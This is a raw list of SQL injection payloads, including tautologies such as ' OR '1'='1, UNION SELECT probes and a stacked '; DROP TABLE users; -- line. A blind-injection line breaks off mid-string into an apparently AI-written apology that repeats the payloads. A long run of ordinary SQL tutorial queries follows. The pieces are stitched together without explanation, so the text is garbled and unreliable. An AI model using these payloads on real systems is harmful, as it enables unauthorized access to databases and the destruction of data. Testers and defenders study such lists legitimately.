' OR '1'='1
'; DROP TABLE users; --
' OR ''='
' OR 'a'='a
" OR "a"="a
') OR ('a'='a
") OR ("a"="a
' OR 'x'='x'; --
" OR "x"="x"; --
') OR ('x'='x'; --
") OR ("x"="x"; --
' OR username LIKE '%
" OR username LIKE '%
') OR (username LIKE '%
") OR (username LIKE '%
' OR email IS NULL; --
" OR email IS NULL; --
') OR (email IS NULL; --
") OR (email IS NULL; --
' OR 'text' LIKE '%%'
" OR "text" LIKE "%%"
') OR ('text' LIKE '%%'
") OR ("text" LIKE "%%"
' OR 'something' IN ('a','b','c')
" OR "something" IN ("a","b","c")
') OR ('something' IN ('a','b','c')
") OR ("something" IN ("a","b","c")
' OR 'a'='a' --
" OR "a"="a" --
') OR ('a'='a' --
") OR ("a"="a" --
' OR 'x'='y' --
" OR "x"="y" --
') OR ('x'='y' --
") OR ("x"="y" --
' OR 1=1; --
" OR 1=1; --
') OR 1=1; --
") OR 1=1; --
' OR 'a'='a' LIMIT 1; --
" OR "a"="a" LIMIT 1; --
') OR ('a'='a') LIMIT 1; --
") OR ("a"="a") LIMIT 1; --
' OR a=a; --
" OR a=a; --
') OR a=a; --
") OR a=a; --
' OR 'a'='b' --
" OR "a"="b" --
') OR 'a'='b' --
") OR "a"="b" --
' OR 'a'='b' GROUP BY x.a; --
" OR "a"="b" GROUP BY x.a; --
') OR 'a'='b' GROUP BY x.a; --
") OR "a"="b" GROUP BY x.a; --
' OR 'a'='b' ORDER BY 'x' --
" OR "a"="b" ORDER BY "x" --
') OR 'a'='b' ORDER BY 'x' --
") OR "a"="b" ORDER BY "x" --
' OR 'a'='b' HAVING 1=1; --
" OR "a"="b" HAVING 1=1; --
') OR 'a'='b' HAVING 1=1; --
") OR "a"="b" HAVING 1=1; --
' OR a=a#
" OR a=a#
') OR a=a#
") OR a=a#
' OR 'a'='a'; --
" OR "a"="a"; --
') OR ('a'='a'); --
") OR ("a"="a"); --
' OR 'a'='b'; --
" OR "a"="b"; --
') OR ('a'='b'); --
") OR ("a"="b"); --
' OR 'a'='b' AND ''='
" OR "a"="b" AND ""="
') OR ('a'='b') AND (''='
") OR ("a"="b") AND (""="
' OR 'a'='b' AND 'x'='y
" OR "a"="b" AND "x"="y
') OR ('a'='b') AND ('x'='y
") OR ("a"="b") AND ("x"="y"
' OR 'a'='b' UNION ALL SELECT 'a', 'b', 'c'; --
" OR "a"="b" UNION ALL SELECT "a", "b", "c"; --
') OR ('a'='b') UNION ALL SELECT 'a', 'b', 'c'; --
") OR ("a"="b") UNION ALL SELECT "a", "b", "c"; --
' OR 'a'='b' UNION SELECT 'a', 'b', 'c'; --
" OR "a"="b" UNION SELECT "a", "b", "c"; --
') OR ('a'='b') UNION SELECT 'a', 'b', 'c'; --
") OR ("a"="b") UNION SELECT "a", "b", "c"; --
' AND ASCII(SUBSTRING((I apologize, but it seems like your query was cut off. If you're looking for examples of SQL injection patterns, here are a few:
```sql
' OR 1=1; --
" OR 1=1; --
') OR 1=1; --
") OR 1=1; --
' OR 'a'='a'; --
" OR "a"="a"; --
') OR ('a'='a'); --
") OR ("a"="a"); --
' OR 'a'='b'; --
" OR "a"="b"; --
') OR ('a'='b'); --
") OR ("a"="b"); --
' OR 'a'='b' AND ''='
" OR "a"="b" AND ""="
') OR ('a'='b') AND (''='
") OR ("a"="b") AND (""="
' OR 'a'='b' AND 'x'='y
" OR "a"="b" AND "x"="y
') OR ('a'='b') AND ('x'='y
") OR ("a"="b") AND ("x"="y"
' OR 'a'='b' UNION ALL SELECT 'a', 'b', 'c'; --
" OR "a"="b" UNION ALL SELECT "a", "b", "c"; --
') OR ('a'='b') UNION ALL SELECT 'a', 'b', 'c'; --
") OR ("a"="b") UNION ALL SELECT "a", "b", "c"; --
' OR 'a'='b' UNION SELECT 'a', 'b', 'c'; --
" OR "a"="b" UNION SELECT "a", "b", "c"; --
') OR ('a'='b') UNION SELECT 'a', 'b', 'c'; --
") OR ("a"="b") UNION SELECT "a", "b", "c"; --
SELECT * FROM Users;
SELECT Username FROM Users;
SELECT * FROM Users WHERE Username='John';
SELECT * FROM Users WHERE UserId=101;
UPDATE Users SET email='john@doe.com' WHERE UserId=101;
DELETE FROM Users WHERE UserId=101;
INSERT INTO Users (Username, Email) VALUES ('John', 'john@doe.com');
SELECT COUNT(*) FROM Users;
SELECT * FROM Users ORDER BY Username;
SELECT DISTINCT Country FROM Users;
SELECT * FROM Users WHERE Username LIKE 'A%';
SELECT * FROM Users WHERE Username LIKE '%a';
SELECT * FROM Users WHERE Username LIKE '%a%';
SELECT * FROM Users LIMIT 10;
SELECT * FROM Users WHERE Username='John' AND Country='USA';
SELECT * FROM Users WHERE Username='John' OR Country='USA';
SELECT * FROM Users WHERE Country IN ('USA', 'UK');
SELECT * FROM Users WHERE Country NOT IN ('USA', 'UK');
SELECT AVG(Score) FROM Users;
SELECT SUM(Score) FROM Users;
SELECT MIN(Score) FROM Users;
SELECT MAX(Score) FROM Users;
SELECT Score FROM Users WHERE Score BETWEEN 60 AND 70;
SELECT * FROM Customers INNER JOIN Orders ON Customers.CustomerId=Orders.CustomerId;
SELECT * FROM Customers LEFT JOIN Orders ON Customers.CustomerId=Orders.CustomerId;
SELECT * FROM Customers RIGHT JOIN Orders ON Customers.CustomerId=Orders.CustomerId;
SELECT * FROM Customers FULL OUTER JOIN Orders ON Customers.CustomerId=Orders.CustomerId;
SELECT CustomerName,COUNT(Orders.OrderId) FROM Customers INNER JOIN Orders ON Customers.CustomerId=Orders.CustomerId GROUP BY CustomerName;
SELECT * FROM Customers WHERE Country='USA' UNION SELECT * FROM Customers WHERE Country='Canada';
SELECT * FROM Customers WHERE Country='USA' UNION ALL SELECT * FROM Customers WHERE Country='Canada';
SELECT * FROM Customers ORDER BY Country ASC, CustomerName DESC;
SELECT * FROM Customers WHERE Country LIKE 'U%';
SELECT * FROM Customers WHERE Country NOT LIKE 'U%';
SELECT * FROM Customers WHERE Country IS NULL;
SELECT * FROM Customers WHERE Country IS NOT NULL;
SELECT CASE WHEN Country='USA' THEN 'Domestic' ELSE 'International' END AS CustomerType FROM Customers;
SELECT * FROM Customers WHERE LEFT(Country, 1) = 'U';
SELECT * FROM Customers WHERE RIGHT(Country, 1) = 'A';
SELECT * FROM Customers WHERE SUBSTRING(Country, 1, 1) = 'U';
SELECT * FROM Customers WHERE LEN(Country) > 3;
SELECT UPPER(Country) FROM Customers;
SELECT LOWER(Country) FROM Customers;
SELECT LTRIM('   Hello ');
SELECT RTRIM('Hello   ');
SELECT TRIM('   Hello   ');
SELECT ROUND(123.456, 2);
SELECT FLOOR(123.456);
SELECT CEILING(123.456);
SELECT * FROM Customers WHERE Country IS NOT NULL AND Country <> '';
SELECT * FROM Customers WHERE Country = COALESCE(@Country, Country);
SELECT * FROM Customers WHERE Country = ISNULL(@Country, Country);
SELECT * FROM Products P JOIN Orders O ON P.ProductId = O.ProductId;
SELECT * FROM Employees WHERE YEAR(HireDate) = 1992;
SELECT * FROM Employees WHERE MONTH(HireDate) = 5;
SELECT * FROM Employees WHERE DAY(HireDate) = 1;
SELECT GETDATE();
SELECT * FROM Orders WHERE OrderDate > GETDATE();
SELECT * FROM Orders WHERE OrderDate < DATEADD(day, -1, GETDATE());
SELECT * FROM Orders WHERE OrderDate BETWEEN DATEADD(day, -7, GETDATE()) AND GETDATE();
SELECT * FROM Orders WHERE DATEDIFF(day, OrderDate, GETDATE()) > 30;
SELECT * FROM Orders WHERE YEAR(OrderDate) = YEAR(GETDATE());
SELECT * FROM Customers WHERE LEN(Country) = 3;
SELECT * FROM Customers WHERE Country LIKE '_S%';
SELECT CONCAT(FirstName, ' ', LastName) AS FullName FROM Customers;
SELECT * FROM Customers WHERE Country = 'USA' AND (City = 'New York' OR City = 'Los Angeles');
SELECT TOP 10 * FROM Products ORDER BY Price DESC;
SELECT TOP 10 PERCENT * FROM Products ORDER BY Price DESC;
SELECT * FROM Orders WHERE CustomerID IN (SELECT CustomerID FROM Customers WHERE Country = 'USA');
SELECT * FROM Orders WHERE ProductID EXISTS (SELECT ProductID FROM Products WHERE Category = 'Beverages');
SELECT * FROM Products WHERE Category = 'Beverages' AND Price > (SELECT AVG(Price) FROM Products);
SELECT * FROM Products WHERE Category = 'Beverages' AND Price IN (SELECT TOP 3 Price FROM Products ORDER BY Price DESC);
SELECT * FROM Orders ORDER BY CASE WHEN OrderDate IS NULL THEN 1 ELSE 0 END, OrderDate;
SELECT FirstName + COALESCE(' ' + MiddleName + ' ', ' ') + LastName AS FullName FROM Customers;
SELECT * FROM Customers WHERE CAST(YEAR(BirthDate) AS VARCHAR) = '1980';
SELECT * FROM Customers WHERE CONVERT(VARCHAR, BirthDate, 103) = '01/01/1980';
SELECT COUNT(DISTINCT Country) FROM Customers;
SELECT FirstName, LastName INTO NewTable FROM Customers;
DROP TABLE Customers;
TRUNCATE TABLE Customers;
CREATE TABLE Customers (Id INT NOT NULL, FirstName VARCHAR(255), LastName VARCHAR(255), DOB DATE);
ALTER TABLE Customers ADD Email VARCHAR(255);
ALTER TABLE Customers DROP COLUMN Email;
CREATE INDEX idx_Customers_FirstName ON Customers (FirstName);
DROP INDEX idx_Customers_FirstName ON Customers;
CREATE VIEW view_Customers AS SELECT FirstName, LastName FROM Customers;
DROP VIEW view_Customers;
INSERT INTO Customers (FirstName, LastName) SELECT FirstName, LastName FROM Old_Customers;
UPDATE Customers SET FirstName = 'John' WHERE EXISTS (SELECT 1 FROM Orders WHERE Orders.CustomerId = Customers.CustomerId AND Orders.OrderDate > '2022-01-01');
DELETE FROM Customers WHERE NOT EXISTS (SELECT 1 FROM Orders WHERE Orders.CustomerId = Customers.CustomerId);
SELECT * FROM Customers CROSS JOIN Countries;
SELECT * FROM Customers CROSS APPLY (SELECT TOP 1 * FROM Orders WHERE Orders.CustomerId = Customers.CustomerId ORDER BY OrderDate DESC) AS MostRecentOrder;
SELECT * FROM Customers PIVOT (COUNT(OrderId) FOR OrderDate IN ([2023-01-01], [2023-02-01], [2023-03-01]));
SELECT * FROM Customers UNPIVOT (OrderCount FOR OrderDate IN (JanuaryOrderCount, FebruaryOrderCount, MarchOrderCount));
WITH Sales_CTE (SalesPersonId, NumberOfOrders) AS (SELECT SalesPersonId, COUNT(*) FROM Orders GROUP BY SalesPersonId) SELECT * FROM Sales_CTE;
WITH RECURSIVE ancestors AS (SELECT EmployeeId, ManagerId FROM Employees WHERE EmployeeId = 1 UNION ALL SELECT E.EmployeeId, E.ManagerId FROM Employees E INNER JOIN ancestors A ON A.ManagerId = E.EmployeeId) SELECT * FROM ancestors;